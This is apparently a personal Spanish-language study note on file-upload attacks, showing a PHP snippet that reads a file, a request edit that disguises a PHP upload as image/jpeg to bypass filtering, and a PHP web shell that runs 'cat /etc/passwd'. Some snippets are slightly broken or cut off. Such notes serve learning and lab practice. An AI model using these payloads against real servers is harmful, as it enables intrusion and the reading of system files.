## Web-Shell-File
Creamos un fichero con el siguiente contenido y se hace un POST mediante la subida del fichero
<?php echo file get contents("");?>

- Para este archivo se hace uso de la funcion de '**get content**' para obtener el contenido del archivo

## Web-Shell Content-Type

Se repite la misma operativa anterior, pero modificando en la request (burpsite) el **content-type** ,de forma que se engaña al servidor con el tipo de contenido subido en el método POST

Ejemplo de respuesta
### Request Original
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: **<mark style="background: #FFB8EBA6;">application/x-php</mark>** 

### Request Modificada
Content-Disposition: form-data; name="avatar"; filename="webshell.php"
Content-Type: **<mark style="background: #FFB8EBA6;">image/jpeg</mark>** 

## Web Shell - Execution Remote

Previamente a subir en la pagina se crea un fichero .php con el siguiente contenido

	- <?php echo shell_exec('cat /etc/passwd'); ?